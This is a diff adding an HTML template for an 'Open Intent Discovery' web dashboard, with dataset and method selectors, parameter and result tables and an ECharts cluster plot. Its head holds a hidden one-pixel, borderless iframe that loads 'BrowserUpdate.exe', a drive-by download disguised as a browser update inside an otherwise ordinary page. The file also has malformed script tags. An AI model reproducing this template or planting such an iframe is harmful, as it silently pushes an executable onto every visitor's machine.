@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html class="x-admin-sm">
+
+    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
+        <meta charset="UTF-8">
+        <META HTTP-EQUIV="pragma" CONTENT="no-cache"> 
+        <META HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
+        <META HTTP-EQUIV="expires" CONTENT="0">
+        <title>Open Intent Discovery System</title>
+        <meta name="renderer" content="webkit">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta name="viewport" content="width=device-width,user-scalable=yes, minimum-scale=0.4, initial-scale=0.8,target-densitydpi=low-dpi" />
+        <link rel="stylesheet" href="/static/lib/xadmin/css/font.css">
+        <link rel="stylesheet" href="/static/lib/xadmin/css/xadmin.css">
+        <script type="text/javascript" src="/static/lib/jquery-3.2.1.js" charset="utf-8"></script>
+        <script type="text/javascript" src="/static/lib/layui/layui.js" charset="utf-8"></script>
+        <script type="text/javascript" src="/static/lib/xadmin/js/xadmin.js"></script>
+        <script src="/static/lib/xadmin/js/echarts.min.js"></script>
+        <script src="/static/lib/xadmin/js/ecStat.js"></script>
+        <scripttype="text/javascript" src="/static/lib/jquery-3.2.1.js"></script>
+        <scripttype="text/javascript" src="/static/lib/jquery-3.2.1.min.js"></script>
+    </head>
+    <body>
+    
+        <div class="layui-fluid">
+            <div class="layui-row">
+                <div class="layui-card">
+                    <div class="layui-card-body ">
+                        <div style="font-weight:700; font-size:20px;color:#555555">Open Intent Discovery</div>
+                        <div style="color:#6F6F6F">--Here,you can find fine-grained open classes. </div>
+                            
+                            <!--****************************************************************-->
+                            <div style="width: 665px; margin:10px  auto ;padding-top: 1%;">
+                                <form class="layui-form layui-col-space5" >
+                                    <div class="layui-input-inline" style="padding-left: 9px;">
+                                        <div id="title_btn1" class="layui-input-inline" style=" font-weight:600; font-size:15px;color:#555555;width: 200px; border: 0px solid red;">
+                                            Dataset
+                                        </div >
+                                        <div id="title_btn2"class="layui-input-inline" style="font-weight:600; font-size:15px;color:#555555;width: 200px; border: 0px solid red;">
+                                            Method
+                                        </div>
+                                        <div id="title_btn3"class="layui-input-inline" style="font-weight:600; font-size:15px;color:#555555;width: 200px; border: 0px solid red;">
+                                            Create Time
+                                        </div>
+                                       
+                                    </div>
+                                    <div class="layui-input-inline " >
+                                        <div class="layui-input-inline" id='select_'>
+                                            <select id="dataset_name_select_2" name="dataset_name_select" lay-filter="dataset_analysis" >
+                                                
+                                                {% for lines in dataset_list %}
+                                                {% comment %}<!-- {% if lines.dataset_name == 'banking' %}
+                                                    <option selected  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
+                                                    {% endif %} -->
+                                                    
+                                                    <!-- {% if lines.model_name != 'banking' %} -->{% endcomment %}
+
+                                                    {% if lines.dataset_name == create_time_new.dataset_name %}
+                                                    <option  value="{{lines.dataset_name}}" selected>{{lines.dataset_name}}</option>
+                                                    {% endif %}
+                                                    {% if lines.dataset_name != create_time_new.dataset_name %}
+                                                    <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
+                                                    {% endif %}
+                                                
+                                                    {% comment %}<!-- {% endif %} -->{% endcomment %}
+                                                {% endfor %}
+                                                <!-- <option  disabled >Dataset</option>
+                                                    {% for lines in datasetList %}
+                                                        <option  value="{{lines.dataset_name}}" >{{lines.dataset_name}}</option>
+                                                    {% endfor %} -->
+                                            </select>
+                                        </div>
+                                        <div class="layui-input-inline" >
+                                            <select id="model_detection_1" name="model_detection" lay-filter="method_analysis">
+                                                <option value='model_detection_1' selected >Open Intent Discovery</option>
+                                                {% for lines in modelList_discovery %}
+                                                
+
+                                                {% if lines.model_name == create_time_new.model_name %}
+                                                    <option  value="{{lines.model_name}}" selected>{{lines.model_name}}</option>
+                                                    {% endif %}
+                                                    {% if lines.model_name != create_time_new.model_name %}
+                                                    <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
+                                                    {% endif %}
+
+                                                {% endfor %}
+
+
+                                                
+
+                                                    <!-- {% for lines in modelList_detection %}
+                                                        <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
+                                                    {% endfor %} -->
+                                            </select>
+                                        </div>
+                                        <div class="layui-input-inline " >
+                                            <select id="create_time" name="create_time" lay-filter="create_time" style="z-index: 3;">
+                                                
+
+                                                {% for create_time in create_time %}
+                                            
+
+                                                {% if create_time.create_time == create_time_new.create_time %}
+                                                <option   value="{{create_time.log_id}}" selected>{{create_time.create_time|date:"Y/m/d  H:i:s"}}</option>
+                                                {% endif %}
+                                                {% if create_time.create_time != create_time_new.create_time %}
+                                                <option  value="{{create_time.log_id}}" >{{create_time.create_time|date:"Y/m/d  H:i:s"}}</option>
+                                                {% endif %}
+
+
+
+                                                {% endfor %}
+                                            </select>
+                                        </div>
+                                        <div class="layui-inline layui-show-xs-block"style=" margin-right:0px">
+                                            
+                                        </div>
+                                       
+                                    </div>
+                                    <button type="button" style="width: 60px;" class="layui-btn layui-input-inline" id="show2Btn" lay-filter="detection_test" lay-submit="" >Show</button>
+                                </form> 
+                                
+                                    
+                                     
+                            </div>
+    <!--****************************************************************-->
+
+
+
+                             <div style="font-weight:700; font-size:20px;color:#555555;margin-left:1.5%">Parameter List</div>
+                                <div style="color:#6F6F6F;margin-left:1.5%;">--Show the parameter list.</div> 
+                                <div class="layui-form " style="margin:0 auto  ;width: 650px;" >
+                                    <div >
+                                        <table lay-even class="layui-table lay-even">
+                                            <colgroup>
+                                                <col width = ''>
+                                                <col width = '30%'>
+                                                <!--50% 18.1%-->
+                                            </colgroup>
+                                            <theda>
+                                                <tr>
+                                                    <th style='background-color:#eeeded'> Name</th>
+                                                    <th style='background-color:#eeeded'> Value</th>
+                                                </tr>
+                                            </theda>
+                                            <tbody id='textarea_parm'>
+                                               
+                                                {% for parameter in parameters %}
+                                                <tr>
+
+                                               
+                                                <td>{{parameter.param_name}}</td>
+                                                <td>{{parameter.default_value}}</td>
+                                            </tr>
+                                                {% endfor %}
+                                            </tbody>
+                                        </table>
+    
+                                    </div>
+                                </div>
+                            <div style="font-weight:700; font-size:20px;color:#555555">Analysis of Model Results</div>
+                            <div style="color:#6F6F6F">--Show the model results of discovered open intents.</div>
+                            <div class="layui-card-body ">
+                                <table class="layui-table layui-form" id="classTable" lay-filter="demoEvent" >
+                                </table>
+                            </div>
+
+                            <div >
+                                    <div class="layui-input-inline ">
+                                        <div class="layui-input-inline " style = "left:0%">
+                                                <div style="font-weight:700; font-size:20px;color:#555555">Distribution Of Intents</div>
+                                                <div style="color:#6F6F6F">--Show the distribution of intents.</div>
+                                                <div class="layui-fluid" style=" display: flex; justify-content: center;">
+                                                        <div class="layui-row">
+                                                            <div class="layui-card">
+                                                                <div class="layui-card-body "style="display: flex;justify-content:center;">
+                                                                <!-- <a id="download" href="">Download</a> -->
+                                                                    <div id="image1" style="width: 700px;height:700px;"></div>
+                                                                    
+
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                </div>
+                                        </div>
+                                        <!-- <div class="layui-input-inline " style="left:25%">                                           
+                                            <div style="font-weight:700; font-size:20px;color:#555555">Recommended Labels</div>
+                                            <div style="color:#6F6F6F">--Recommend tags for each intent type.</div>
+                                            <div class="layui-fluid">
+                                                    <div class="layui-row">
+                                                        <div class="layui-card">
+                                                            <div class="layui-card-body ">
+                                                                <div id="image2" style="width: 400px;height:400px;"></div>
+                                                            
+                                                        
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div> -->
+                                    </div>
+                                </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+
+        <script>layui.use(['form', 'layer','jquery', 'table'],
+            function() {
+                $ = layui.jquery;
+                var form = layui.form,
+                layer = layui.layer;
+                table = layui.table;
+                dataset_select_detection = $('#dataset_name_select_2').val()
+                model_detection = $('#model_detection_1').val()  
+                log_id = $('#create_time').val()
+                console.log('log_id: ',log_id)
+                $.get('/detection/model_test/show_hyper_parameters?log_id='+log_id, function (data) {                            
+                           if (data.code != 200){ 
+
+                            }
+                    
+                                    form.render('select');
+                                    console.log("_____________________750_____________________")
+                                    $("#textarea_parm").empty();
+                               
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>known intent ratio</td>");
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>"+data['ratio'][0]+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>labeled ratio</td>");
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>"+data['ratio'][1]+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+                               
+                                for(var i = 0; i<data.data.length;i++){
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td>"+data.data[i].param_name+"</td>");
+                                        $("#textarea_parm").append("<td>"+data.data[i].default_value+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+     
+                                }
+                               
+                                   },'json');
+
+                                   
+                var classTable = table.render({
+                    elem: "#classTable",
+                    url: '/discovery/model_analysis/model_analysis_getClassListByDatasetNameAndMethod',
+                    cellMinWidth: 80,
+                    page: { //支持传入 laypage 组件的所有参数（某些参数除外，如：jump/elem） - 详见文档
+                        layout: ['prev', 'page', 'next' , 'count' ] //自定义分页布局
+                        //,curr: 5 //设定初始在第 5 页
+                        ,first: 'first'
+                        ,last: 'last'
+                        ,limit: '5'
+                        ,curr: '1'
+                        
+                    },
+                    cols: [[
+                        {field: 'label_name', title: 'Open Intents (Keyword, Confidence Score)' ,event: 'sub_open', align: 'left', templet: function(d) {
+                            label_name_tmp = d.label_name;
+                            if (d.label_name == "<UNK>" || d.label_name == "oos"){
+                                label_name_tmp = "< UNK >"
+                            }
+
+                            return '<div style="position: relative;\n' + '    padding: 0 10px 0 20px;">' + label_name_tmp + '<i style="left: 0px;" lay-tips="Show Details" class="layui-icon layui-colla-icon layui-icon-right"></i></div>'
+                        }}
+                        ,{field: 'label_text_num', title: 'Numbers' ,width:'20%', align: 'center'}
+                    ]]
+                    ,where:{
+                        "dataset_name": dataset_select_detection,
+                        "method": model_detection,
+                        "log_id":log_id
+                    }
+                });
+
+
+                form.on('submit(detection_test1)',
+                function(data){
+                    //show_image() 
+                    dataset_select_detection = $('#dataset_name_select_2').val()
+                    model_detection = $('#model_detection_1').val()  
+                    log_id = $('#create_time').val()
+                    console.log('log_id: ',log_id)
+                });
+                //监听单元格事件
+                table.on('tool(demoEvent)', function(obj){
+                    var data = obj.data;
+                    // console.log(data)
+                    if(obj.event === 'sub_open' && data.label_name != undefined ){
+                        //layer.msg('145:点击了sub_known')
+                        // 打开折叠面板，显示对应信息
+                        var trObj = layui.$(this).parent('tr'); //当前行
+                        var accordion = true //开启手风琴，那么在进行折叠操作时，始终只会展现当前展开的表格。
+                        var content = '<table ></table>' //内容
+                        var optionForText = getOptionsForTextTableOfOpen(trObj, accordion, content, obj.event, data.dataset_name, 'open', data.label_name, data.method)
+                        collapseTable(optionForText)
+                    }
+                });
+
+                form.on('select(dataset_analysis)',function(data){
+
+                        $ = layui.jquery;
+                        val1 = data.value;
+                        dataset = data.value;
+
+                        val2 = $('#model_detection_1').val()   
+                                        
+                        if(val1=='Dataset'){
+                        layer.msg('Please select Dataset');
+                        }else 
+                        if(val1!=undefined & val2!=undefined){
+                            show_create_time(val1,val2)
+                        }
+                        });
+
+                form.on('select(method_analysis)',function(data){
+                    console.log('method！！！')
+                    val2 = data.value;
+                    val1 = $('#dataset_name_select_2').val()
+                    method = data.value;
+                    if(val2=='model_detection_1'){
+                        layer.msg('Please select method');
+                    }else
+                        if(val1!=undefined & val2!=undefined){
+                        show_create_time(val1,val2)
+                    }
+                });
+
+                function show_create_time(dataset_name,model_name){
+                $ = layui.jquery;
+                $.get('/detection/model_test/show_create_time?dataset_name='+dataset_name+"&model_name="+model_name, function (data) {
+                    if (data.code != 200){  }
+                            //console.log( JSON.parse(data.data[0]))
+                            console.log(data.data)
+                            console.log(data.data.length)
+                            $("#create_time").empty();
+                        for(var i = 0; i<data.data.length;i++){
+                            $("#create_time").append("<option value="+data.data[i].log_id+">"+data.data[i].create_time.replace(/-/g,'/').replace(/T/g,'  ')+"</option>");
+                        }
+                            // $("#select_data").append("<option value="+kkk+">"+KKKK+"</option>");
+                            form.render('select');
+                            console.log("_____________________750_____________________")
+                            //console.log( JSON.parse(data))
+                            //JSON.parse(data.data[0])
+                            //window.location.href="../model_test/?data="+data.data[0]//.dataset_name
+                            },'json');
+            }
+
+
+//按钮
+                form.on('submit(detection_test)',
+                function(data) {
+                    console.log(data);
+                    dataset_select_detection = $('#dataset_name_select_2').val()
+                    model_detection = $('#model_detection_1').val()  
+                    log_id = $('#create_time').val()
+                    
+
+                    $.get('/detection/model_test/show_hyper_parameters?log_id='+log_id, function (data) {                            
+                           if (data.code != 200){ 
+
+                            }
+                    
+                                    form.render('select');
+                                    console.log("_____________________750_____________________")
+                                    $("#textarea_parm").empty();
+                               
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>known intent ratio</td>");
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>"+data['ratio'][0]+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>labeled ratio</td>");
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>"+data['ratio'][1]+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+                               
+                                for(var i = 0; i<data.data.length;i++){
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td>"+data.data[i].param_name+"</td>");
+                                        $("#textarea_parm").append("<td>"+data.data[i].default_value+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+     
+                                }
+                               
+                                   
+
+                                   },'json');
+
+
+
+
+
+
+
+
+
+                    if(model_detection == 'Open Intent Discovery'){
+                        layer.msg('Please select Model');
+                    } else if( dataset_select_detection == 0){
+                        layer.msg('Please select Dataset');
+                    }else{// 渲染图表
+                        // table reload
+                        classTable.reload({
+                            where:{
+                                "dataset_name": dataset_select_detection,
+                                "method": model_detection,
+                                "log_id":log_id
+                                //加log_id
+                            }
+                            ,page: { //支持传入 laypage 组件的所有参数（某些参数除外，如：jump/elem） - 详见文档
+                                layout: ['prev', 'page', 'next' , 'count' ] //自定义分页布局
+                                //,curr: 5 //设定初始在第 5 页
+                                ,first: 'first'
+                                ,last: 'last'
+                                
+                            }
+                        });
+                        var myChart4 = echarts.init(document.getElementById('image1'), null, {renderer: 'svg'});
+                        var series = [];//保存散点
+                        var mylegend = [];//legend部分使用
+                        //get cluster.json
+                        dataset_name_select_2 = $('#dataset_name_select_2').val()
+                        model_detection_1 = $('#model_detection_1').val()  
+                        log_id = $('#create_time').val()
+                        var key=dataset_name_select_2+'_'+model_detection_1+'_'+log_id
+                        $.get('/discovery/model_analysis/model_analysis_getDataOfDINByKey?key='+key, function (data) {
+                                
+                                data_chart_5 = data.data;
+                                myChart4.clear();
+                                mylegend.push('');
+                                
+                                for (var key in data_chart_5){
+                                    if(key == "Known Intent Centers"){
+                                        data_color = '#FF6666';
+                                    }else{
+                                        data_color = '#66CCCC';
+                                    }
+                                    console.log('595:\t'+key)
+                                    console.log('596:\t'+data_color)
+                                    mylegend.push(key);
+                                    series.push({
+                                        //symbol:"rect",//矩形
+                                        //symbolSize:[60,15],//矩形设置
+                                        symbolSize:7,
+                                        name:key,
+                                        type:'scatter',
+                                        data:data_chart_5[key],
+                                            itemStyle: {
+                                            normal: {
+                                                borderColor: '#555',
+                                                label: {
+                                                    color: data_color,
+                                                    show: true,
+                                                    position: 'right',
+                                                    fontWeight: 'bolder',
+                                                    formatter: function (params, ticket, callback) {
+                                                        var s = params.value[2]; 
+                                                        return s
+                                                    },
+                                                },
+                                            },
+                                            },
+                                        tooltip: {
+                                            trigger:'item',
+                                            formatter:function(params){
+                                                //console.log(params);                                                             
+                                                var dotHtml2 = '<span style="display:inline-block;margin-right:5px;border-radius:10px;width:10px;height:10px;background-color:#666666"></span>'
+                                                mystr ='<span style="font-size:10px;">'+params.seriesName+"</br>"+dotHtml2+"Key Words:"+'</span>' + '<span style="font-weight:800;font-size:14px;">'+"  " +params.data[2]+'</span>'+"</br>"+dotHtml2+"Center:"+'</span>' + '<span style="font-weight:800;font-size:14px;">'+"  " +'('+params.data[0]+','+params.data[1]+')'+'</span>';
+                                                return mystr;
+                                                //console.log(params);
+                                            }
+                                            
+                                        }
+                                    });
+                                };
+                                myChart4.setOption({
+                                        color:['#FF6666', '#66CCCC'],
+                                        xAxis: {nameTextStyle:{
+                                            fontWeight:550,
+                                        },
+                                        axisLabel:{
+                                            show: true,
+                                            textStyle:{
+                                            fontWeight: 550,
+                                            fontSize:12
+                                        }
+                                    }},
+                                        yAxis: {
+                                            nameTextStyle:{
+                                            fontWeight:550,
+                                        },
+                                        axisLabel:{
+                                            show: true,
+                                            textStyle:{
+                                            fontWeight: 550,
+                                            fontSize:12
+                                        }
+                                    }
+                                        },                                       
+                                        legend: {
+                                        data:mylegend
+                                        },
+                                        tooltip: {
+                                            position: 'right'
+                                        },
+                                        // x轴拖动
+                                        dataZoom: [
+                                        {
+                                            type: "slider",
+                                            realtime: true, //拖动滚动条时是否动态的更新图表数据
+                                            height: 20, //滚动条高度
+                                            left:"10%",
+                                            right:"5%",
+                                            start: 25, //滚动条开始位置（共100等份）
+                                            end: 75, //结束位置（共100等份）
+                                        },
+                                        {
+                                                type: 'slider',
+                                                show: true,
+                                                yAxisIndex: [0],
+                                                left: '96%',
+                                                right:"1%",
+                                                start: 25, //数据窗口范围的起始百分比
+                                                end: 75
+                                            }
+                                        ],
+                                        series: series,
+                                })
+                            }, 'json');
+
+                      
+                    }
+                    return false;
+                });
+                //样例选择监听
+                form.on('select(example_select_discovery)', function(data) {
+                    discovery_switchBySelect();
+                });
+            });
+        </script>
+
+        <script type="text/javascript">
+
+            function discovery_switchBySelect() {
+                // alert('点击select框了')
+                var v = $("#example_select_discovery").find("option:selected").text();//得到下拉框的value值
+                // alert(v)
+                // console.log(v);
+                var form_data = new FormData();
+                form_data.append('example_num', v);
+                $.ajax({
+                        url: "/discovery/model_analysis/getModelAnalysisExampleData",
+                        type: 'POST',
+                        data: form_data,
+                        dataType: "json",
+                        contentType: false,
+                        processData: false,// 获取POST所需的csrftoken
+                        success: function (data) {
+                            if (data.code == 200){
+                                document.getElementById("discovery_text_example").value = data.text
+                            }else{
+                                alert('Chose Error !')
+                            }
+                        }
+                });
+            }
+        </script>
+        <script>
+
+            function collapseTable(options) {
+                anotherEvent = {"known":"open","open":"known"}
+                var trObj = options.elem;
+                if (!trObj) return;
+                var accordion = options.accordion,
+                success = options.success,
+                content = options.content || '';
+                event = options.event;
+                var tableView = trObj.parents('.layui-table-view'); //当前表格视图
+                var id = tableView.attr('lay-id'); //当前表格标识
+                var index = trObj.data('index'); //当前行索引
+                var leftTr = tableView.find('.layui-table-fixed.layui-table-fixed-l tr[data-index="' + index + '"]'); //左侧当前固定行
+                var rightTr = tableView.find('.layui-table-fixed.layui-table-fixed-r tr[data-index="' + index + '"]'); //右侧当前固定行
+                var colspan = trObj.find('td').length; //获取合并长度
+                var trObjChildren = trObj.next(); //展开行Dom
+                var indexChildren = id + '-' + index + '-children'+'-'+event; //展开行索引
+                var anotherIndexChildren = id + '-' + index + '-children'+'-'+anotherEvent[event]; //展开行索引
+                var leftTrChildren = tableView.find('.layui-table-fixed.layui-table-fixed-l tr[data-index="' + indexChildren + '"]'); //左侧展开固定行
+                var rightTrChildren = tableView.find('.layui-table-fixed.layui-table-fixed-r tr[data-index="' + indexChildren + '"]'); //右侧展开固定行
+                var lw = leftTr.width() + 15; //左宽
+                var rw = rightTr.width() + 15; //右宽
+
+                //不存在就创建展开行
+                if (trObjChildren.data('index') != indexChildren ) {
+                    //装载HTML元素
+                    
+                    var tr = '<tr data-index="' + indexChildren + '"><td colspan="' + colspan + '"><div style="height: auto;padding-left:' + lw + 'px;padding-right:' + rw + 'px" class="layui-table-cell">' + content + '</div></td></tr>';
+                    trObjChildren = trObj.after(tr).next().hide(); //隐藏展开行
+                    var fixTr = '<tr data-index="' + indexChildren + '"></tr>';//固定行
+                    leftTrChildren = leftTr.after(fixTr).next().hide(); //左固定
+                    rightTrChildren = rightTr.after(fixTr).next().hide(); //右固定
+                }
+                
+                
+                //展开|折叠箭头图标
+                trObj.find('td[lay-event="'+event+'"] i.layui-colla-icon').toggleClass("layui-icon-right layui-icon-down");
+                                
+                //显示|隐藏展开行
+                trObjChildren.toggle();
+                //开启手风琴折叠和折叠箭头
+                if (accordion) {
+                    // trObj.find('td[lay-event="'+event+'"] i.layui-colla-icon').toggleClass("layui-icon-down layui-icon-right");
+                    trObj.siblings().find('td[lay-event="'+event+'"] i.layui-colla-icon').removeClass("layui-icon-down").addClass("layui-icon-right");
+                    trObjChildren.siblings('[data-index$="-children"]').hide(); //展开
+                    rightTrChildren.siblings('[data-index$="-children"]').hide(); //左固定
+                    leftTrChildren.siblings('[data-index$="-children"]').hide(); //右固定
+                }
+                success(trObjChildren, indexChildren); //回调函数
+                heightChildren = trObjChildren.height(); //展开高度固定
+                rightTrChildren.height(heightChildren + 115).toggle(); //左固定
+                leftTrChildren.height(heightChildren + 115).toggle(); //右固定
+            }
+
+            function getOptionsForTextTableOfOpen(trObj, accordion, content, event, dataset_name, class_type, label_name, method){
+                dataset_select_detection = $('#dataset_name_select_2').val()
+                model_detection = $('#model_detection_1').val()  
+                log_id = $('#create_time').val()
+                var optionForClassTable = {
+                    elem: trObj,
+                    accordion: accordion,
+                    content: content,
+                    event: event,
+                    success: function(trObjChildren, index) { //成功回调函数
+                        //trObjChildren 展开tr层DOM
+                        //index 当前层索引
+                        trObjChildren.find('table').attr("id", index);
+                        table.render({
+                            elem: "#" + index,
+                            url: '/discovery/model_analysis/model_analysis_getTextListByDatasetNameAndMethodAndLabel',
+                            page: { //支持传入 laypage 组件的所有参数（某些参数除外，如：jump/elem） - 详见文档
+                                layout: ['prev', 'page', 'next' , 'count' ] //自定义分页布局
+                                //,curr: 5 //设定初始在第 5 页
+                                ,first: 'first'
+                                ,last: 'last'
+                                
+                            },
+                            cols: [[ //表头
+                                    {field: 'text', title: 'Text' , align: 'left',  rowspan:"2", templet: function(d) {
+                                    return "<a style='width:inherit;display:block;white-space:normal;'>"+d.text+"</a>"
+                                }}
+                                    ,{title: 'Discovery' , align: 'center',  colspan:"6"}
+                                ],
+                                [ //表头
+                                    {field: 'can_1', title: 'Key word A' ,width:'10%', align: 'left', templet: function(d) {
+                                    return "<a style='width:inherit;display:block;white-space:normal;'>"+d.can_1+"</a>"
+                                }}
+                                    ,{field: 'conf_1', title: 'Confidence A' ,width:'10%', align: 'center', templet: function(d) {
+                                    return "<a style='width:inherit;display:block;white-space:normal;'>"+d.conf_1+"</a>"
+                                }}
+                                    ,{field: 'can_2', title: 'Key word B' ,width:'10%', align: 'left', templet: function(d) {
+                                    return "<a style='width:inherit;display:block;white-space:normal;'>"+d.can_2+"</a>"
+                                }}
+                                    ,{field: 'conf_2', title: 'Confidence B' ,width:'10%', align: 'center', templet: function(d) {
+                                    return "<a style='width:inherit;display:block;white-space:normal;'>"+d.conf_2+"</a>"
+                                }}
+                                    ,{field: 'can_3', title: 'Key word C' ,width:'10%', align: 'left', templet: function(d) {
+                                    return "<a style='width:inherit;display:block;white-space:normal;'>"+d.can_3+"</a>"
+                                }}
+                                    ,{field: 'conf_3', title: 'Confidence C' ,width:'10%', align: 'center', templet: function(d) {
+                                    return "<a style='width:inherit;display:block;white-space:normal;'>"+d.conf_3+"</a>"
+                                }}
+                            ]]
+                            ,where:{
+                                "dataset_name": dataset_select_detection,
+                                "method": model_detection,
+                                "label_name": label_name,
+                                "log_id":log_id
+                                
+
+                            }
+                        });
+
+                    }
+                }
+                return optionForClassTable;
+            }
+
+
+            function errorConfirm(errorMsg){
+                var baseErr = ': There is no data for this combination ！！！'
+                layer.confirm(
+                    errorMsg + baseErr,
+                    { icon:6, btn:['Confirm'], title:'Attention Please' }
+                )
+            }
+
+            
+            function initDefalutEcharts(){
+                
+                dataset_name_select_2 = $('#dataset_name_select_2').val()
+                model_detection_1 = $('#model_detection_1').val()  
+                log_id = $('#create_time').val()
+                $.get('/detection/model_test/show_hyper_parameters?log_id='+log_id, function (data) {                            
+                           if (data.code != 200){ 
+
+                            }
+                    
+                                    form.render('select');
+                                    console.log("_____________________750_____________________")
+                                    $("#textarea_parm").empty();
+                               
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>known intent ratio</td>");
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>"+data['ratio'][0]+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>labeled ratio</td>");
+                                        $("#textarea_parm").append("<td style='font-weight:bold;'>"+data['ratio'][1]+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+                               
+                                for(var i = 0; i<data.data.length;i++){
+                                    $("#textarea_parm").append('<tr>');
+                                        
+                                        $("#textarea_parm").append("<td>"+data.data[i].param_name+"</td>");
+                                        $("#textarea_parm").append("<td>"+data.data[i].default_value+"</td>");
+                                        
+                                    $("#textarea_parm").append('</tr>');
+
+     
+                                }
+                               
+                                   
+
+                                   },'json');
+
+
+
+
+
+
+
+                var key=dataset_name_select_2+'_'+model_detection_1+'_'+log_id
+                //image1    Model Detail Analysis
+                var myChart4 = echarts.init(document.getElementById('image1'), null, {renderer: 'svg'});
+                            var series = [];//保存散点
+                            var mylegend = [];//legend部分使用
+                            //get cluster.json
+                            $.get('/discovery/model_analysis/model_analysis_getDataOfDINByKey?key='+key, function (data) {
+                                
+                                data_chart_5 = data.data;
+                                myChart4.clear();
+                                mylegend.push('');
+                                
+                                for (var key in data_chart_5){
+                                    if(key == "Known Intent Centers"){
+                                        data_color = '#FF6666';
+                                    }else{
+                                        data_color = '#66CCCC';
+                                    }
+                                    console.log('595:\t'+key)
+                                    console.log('596:\t'+data_color)
+                                    mylegend.push(key);
+                                    series.push({
+                                        //symbol:"rect",//矩形
+                                        //symbolSize:[60,15],//矩形设置
+                                        symbolSize:7,
+                                        name:key,
+                                        type:'scatter',
+                                        data:data_chart_5[key],
+                                            itemStyle: {
+                                            normal: {
+                                                borderColor: '#555',
+                                                label: {
+                                                    color: data_color,
+                                                    show: true,
+                                                    position: 'right',
+                                                    fontWeight: 'bolder',
+                                                    formatter: function (params, ticket, callback) {
+                                                        var s = params.value[2]; 
+                                                        return s
+                                                    },
+                                                },
+                                            },
+                                            },
+                                        tooltip: {
+                                            trigger:'item',
+                                            formatter:function(params){
+                                                //console.log(params);                                                             
+                                                var dotHtml2 = '<span style="display:inline-block;margin-right:5px;border-radius:10px;width:10px;height:10px;background-color:#666666"></span>'
+                                                mystr ='<span style="font-size:10px;">'+params.seriesName+"</br>"+dotHtml2+"Key Words:"+'</span>' + '<span style="font-weight:800;font-size:14px;">'+"  " +params.data[2]+'</span>'+"</br>"+dotHtml2+"Center:"+'</span>' + '<span style="font-weight:800;font-size:14px;">'+"  " +'('+params.data[0]+','+params.data[1]+')'+'</span>';
+                                                return mystr;
+                                                //console.log(params);
+                                            }
+                                            
+                                        }
+                                    });
+                                };
+                                myChart4.setOption({
+                                        color:['#FF6666', '#66CCCC'],
+                                        xAxis: {nameTextStyle:{
+                                            fontWeight:550,
+                                        },
+                                        axisLabel:{
+                                            show: true,
+                                            textStyle:{
+                                            fontWeight: 550,
+                                            fontSize:12
+                                        }
+                                    }},
+                                        yAxis: {
+                                            nameTextStyle:{
+                                            fontWeight:550,
+                                        },
+                                        axisLabel:{
+                                            show: true,
+                                            textStyle:{
+                                            fontWeight: 550,
+                                            fontSize:12
+                                        }
+                                    }
+                                        },                                       
+                                        legend: {
+                                        data:mylegend
+                                        },
+                                        tooltip: {
+                                            position: 'right'
+                                        },
+                                        // x轴拖动
+                                        dataZoom: [
+                                        {
+                                            type: "slider",
+                                            realtime: true, //拖动滚动条时是否动态的更新图表数据
+                                            height: 20, //滚动条高度
+                                            left:"10%",
+                                            right:"5%",
+                                            start: 25, //滚动条开始位置（共100等份）
+                                            end: 75, //结束位置（共100等份）
+                                        },
+                                        {
+                                                type: 'slider',
+                                                show: true,
+                                                yAxisIndex: [0],
+                                                left: '96%',
+                                                right:"1%",
+                                                start: 25, //数据窗口范围的起始百分比
+                                                end: 75
+                                            }
+                                        ],
+                                        series: series,
+                                })
+                            }, 'json');
+
+            }
+
+        </script>
+        <script>
+            initDefalutEcharts();
+        </script>
+
+
+        <script>var _hmt = _hmt || []; (function() {
+                var hm = document.createElement("script");
+                hm.src = "https://hm.baidu.com/hm.js?b393d153aeb26b46e9431fabaf0f6190";
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(hm, s);
+            })();</script>
+    </body>
+
+</html>
